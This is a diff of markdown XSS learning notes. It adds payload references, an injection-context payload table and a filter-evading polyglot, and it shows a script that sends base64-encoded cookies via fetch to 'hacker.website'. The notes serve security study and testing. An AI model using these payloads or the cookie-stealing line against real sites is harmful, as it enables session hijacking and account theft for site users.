@@ -12,12 +12,22 @@ Cross-site Scripting, most commonly called **XSS**, refer to injecting malicious
 <script>alert('XSS');</script>
 ```
 
+<br>
+
+You will most likely use these references:
+
+* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) (42.5k ⭐)
+* [OWASP Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) (22k ⭐)
+* [OWASP DOM XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) (22k ⭐)
+</div><div>
+
+<p class="text-center">Some attacks</p>
+
 **Session hijacking**: anyone executing this script will send their cookie to a malicious website owned by the hacker used to capture cookies. The script is using `btoa()` to encode in base64 the values. Sessions cookies are gold 💰, because with them, we can simulate that we are logged, and bypass verifications such as 2FA.
 
 ```js
 <script>fetch('https://hacker.website/steal?cookie=' + btoa(document.cookie));</script>
 ```
-</div><div>
 
 **A simple keylogger**: send each key pressed is sent to the hacker website. The script is using `btoa()` to encode in base64 the values.
 
@@ -78,4 +88,40 @@ In blind XSS, you are usually sending a payload in a contact/support... forms, i
 </div><div>
 
 See [xsshunter](https://github.com/mandatoryprogrammer/xsshunter) (1.2k ⭐)
+</div></div>
+
+<hr class="sl">
+
+## XSS payloads
+
+<table class="table table-bordered table-striped border-dark mt-4">
+<thead>
+<tr><th>Case</th><th>HTML</th><th>Payload</th></tr>
+</thead>
+<tbody>
+
+<tr><td>Boxed attribute</td><td><code>&lt;input value="here"&gt;</code></td><td><code>">MaliciousCodeHere</code></td></tr>
+
+<tr><td>Unboxed attribute</td><td><code>&lt;input value=here&gt;</code></td><td><code>>MaliciousCodeHere</code></td></tr>
+
+<tr><td>Wrapped</td><td><code>&lt;textarea>here&lt;/textarea&gt;</code></td><td><code>&lt;/textarea&gt;MaliciousCodeHere</code></td></tr>
+
+<tr><td>JavaScript</td><td><code>xxx.innerHTML = 'here';</code></td><td><code>';MaliciousCodeHere;//</code></td></tr>
+
+</tbody></table>
+
+<hr class="sr">
+
+## Polyglots - the magic payloads
+
+<div class="row row-cols-md-2"><div>
+
+XSS polyglots are sort of magic payloads designed to bypass many tags/attributes/filters/... at once.
+</div><div>
+
+An example
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+```
 </div></div>
